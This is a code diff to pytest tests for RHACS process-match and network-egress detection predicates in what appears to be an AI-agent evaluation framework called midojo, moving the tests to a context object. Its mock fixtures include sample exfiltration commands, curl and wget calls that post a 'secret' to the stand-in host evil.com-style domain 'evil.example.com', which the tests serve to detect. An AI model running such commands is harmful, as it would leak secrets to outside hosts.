@@ -2,7 +2,7 @@ from unittest.mock import MagicMock
 
 import pytest
 
-from midojo.predicates import parse_predicate
+from midojo.predicates import EvaluationContext, parse_predicate
 from midojo.providers.rhacs import (
     AcsNetworkEgress,
     AcsProcessMatch,
@@ -27,7 +27,10 @@ def _make_provider(processes=None, network_flows=None):
 
 
 def _ctx(provider):
-    return {"rhacs": provider}
+    return EvaluationContext(agent_output="", pre_env=EMPTY, post_env=EMPTY, providers={"rhacs": provider})
+
+
+_NO_PROVIDER_CTX = EvaluationContext(agent_output="", pre_env=EMPTY, post_env=EMPTY)
 
 
 def _make_process(exec_path: str, args: str, time: str = "2026-06-01T12:05:00Z") -> dict:
@@ -40,14 +43,14 @@ class TestAcsProcessMatch:
             _make_process("/usr/bin/curl", "-X POST https://evil.example.com/collect -d secret"),
         ])
         p = AcsProcessMatch(args_contains="evil.example.com")
-        assert p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert p.evaluate(_ctx(provider))
 
     def test_no_match(self):
         provider = _make_provider(processes=[
             _make_process("/usr/bin/curl", "-X POST https://httpbin.org/post"),
         ])
         p = AcsProcessMatch(args_contains="evil.example.com")
-        assert not p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert not p.evaluate(_ctx(provider))
 
     def test_match_with_binary_filter(self):
         provider = _make_provider(processes=[
@@ -55,31 +58,31 @@ class TestAcsProcessMatch:
             _make_process("/usr/bin/wget", "https://evil.example.com"),
         ])
         p = AcsProcessMatch(args_contains="evil.example.com", binary="curl")
-        assert p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert p.evaluate(_ctx(provider))
 
     def test_binary_filter_excludes(self):
         provider = _make_provider(processes=[
             _make_process("/usr/bin/wget", "https://evil.example.com"),
         ])
         p = AcsProcessMatch(args_contains="evil.example.com", binary="curl")
-        assert not p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert not p.evaluate(_ctx(provider))
 
     def test_empty_processes(self):
         provider = _make_provider(processes=[])
         p = AcsProcessMatch(args_contains="evil.example.com")
-        assert not p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert not p.evaluate(_ctx(provider))
 
     def test_case_insensitive(self):
         provider = _make_provider(processes=[
             _make_process("/usr/bin/curl", "https://EVIL.EXAMPLE.COM/collect"),
         ])
         p = AcsProcessMatch(args_contains="evil.example.com")
-        assert p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert p.evaluate(_ctx(provider))
 
     def test_requires_context(self):
         p = AcsProcessMatch(args_contains="evil.example.com")
         with pytest.raises(RuntimeError, match="requires the 'rhacs' verification provider"):
-            p.evaluate("", EMPTY, EMPTY)
+            p.evaluate(_NO_PROVIDER_CTX)
 
 
 class TestAcsNetworkEgress:
@@ -98,7 +101,7 @@ class TestAcsNetworkEgress:
             },
         ]))
         p = AcsNetworkEgress(dest_not_in=["litellm-prod"])
-        assert p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert p.evaluate(_ctx(provider))
 
     def test_allowlisted_dest_passes(self):
         provider = _make_provider(network_flows=self._graph([
@@ -112,7 +115,7 @@ class TestAcsNetworkEgress:
             },
         ]))
         p = AcsNetworkEgress(dest_not_in=["litellm-prod"])
-        assert not p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert not p.evaluate(_ctx(provider))
 
     def test_no_edges(self):
         provider = _make_provider(network_flows=self._graph([
@@ -122,12 +125,12 @@ class TestAcsNetworkEgress:
             },
         ]))
         p = AcsNetworkEgress(dest_not_in=[])
-        assert not p.evaluate("", EMPTY, EMPTY, _ctx(provider))
+        assert not p.evaluate(_ctx(provider))
 
     def test_requires_context(self):
         p = AcsNetworkEgress(dest_not_in=[])
         with pytest.raises(RuntimeError, match="requires the 'rhacs' verification provider"):
-            p.evaluate("", EMPTY, EMPTY)
+            p.evaluate(_NO_PROVIDER_CTX)
 
 
 class TestParseAcsPredicates:
